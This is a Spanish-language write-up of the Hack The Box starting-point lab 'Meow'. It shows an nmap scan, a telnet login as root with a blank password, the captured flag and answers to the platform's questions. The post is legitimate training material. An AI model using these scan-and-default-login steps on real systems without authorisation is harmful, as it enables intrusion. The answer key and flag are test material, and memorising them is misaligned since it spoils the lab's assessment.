---
layout: single
title: <span class="htb">Meow - <span class="starting_point">Starting point</span> - Hack The Box</span>
excerpt: "En este post vamos a comenzar con las máquinas del starting point del tier 0, la primera es Meow y será la elegida para este primer write up.
Me voy a centrar en el proceso de explotación ya que exiten diferentes preguntas las cuales no aportan elementos de valor, en el caso de que sean indispensables
para llevar acabo la explotación citaré los recursos en el proceso."
date: 2022-07-06
classes: wide
header:
  teaser: /assets/images/Meow/Descripcion_meow.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.png
categories:
  - Hack The Box
  - Starting point
  - Tier 0
tags: 
  - Telnet
  - Nmap
---

## DESCRIPCION

En este post vamos a comenzar con las máquinas del starting point del tier 0, la primera es Meow y será la elegida para este primer write up.
Me voy a centrar en el proceso de explotación ya que exiten diferentes preguntas las cuales no aportan elementos de valor, en el caso de que sean indispensables
para llevar acabo la explotación citaré los recursos en el proceso.

## INDICE

- [Escaneo de puertos](#escaneo-de-puertos)
- [Conexión por telnet](#conexion-por-telnet)
- [Respuestas HTB](#respuestas)

## ESCANEO DE PUERTOS

Vamos a lanzar un escaneo básico para encontrar los puertos abiertos en la máquina.

```zsh
nmap --open -p- 10.129.74.180 -T5 -oG Puertos
Host: 10.129.74.180 ()  Status: Up
Host: 10.129.74.180 ()  Ports: 23/open/tcp//telnet///

```

Podemos ver que el protocolo telnet esta abierto, lanzaremos los scripts predeterminados de nmap al puerto 23.

```zsh
nmap -sCV -p 23 -oN Objetivos 10.129.1.17
Nmap scan report for 10.129.1.17
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Por lo que se puede ver es una máquina linux, pero no obtenemos demasiada información, al no encontrar más puertos por los que intentar comprometer el host, podemos proceder a logueranos
por telnet.

## CONEXION POR TELNET

Intentamos conectarnos con `Usuario:root`.

```zsh
❯ telnet 10.129.1.17
Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 06 Jul 2022 01:03:13 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.17
  IPv6 address for eth0: dead:beef::250:56ff:fe96:d4ec

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 
```

Por un error de configuración el usuario root no tiene contraseña dando acceso a la máquina de forma instantánea. Siendo root solo nos queda buscar la flag.

```zsh
root@Meow:~# pwd
/root
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19

```
Hemos explotado la primera máquina del starting point tier 0 con èxito. 

## RESPUESTAS

### Pregunta 1

What does the acronym VM stand for?

`Virtual Machine`

### Pregunta 2

What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

`terminal`

### Pregunta 3

What service do we use to form our VPN connection into HTB labs?

`openvpn`

### Pregunta 4

What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output?

`tun`

### Pregunta 5

What tool do we use to test our connection to the target with an ICMP echo request?

`ping`


### Pregunta 6

What is the name of the most common tool for finding open ports on a target?

`nmap`

### Pregunta 7

What service do we identify on port 23/tcp during our scans?

`telnet`

### Pregunta 8

What username is able to log into the target over telnet with a blank password?

`root`


### Bandera

Submit root flag

`b40abdfe23665f766f9c61ecba8a4c19`


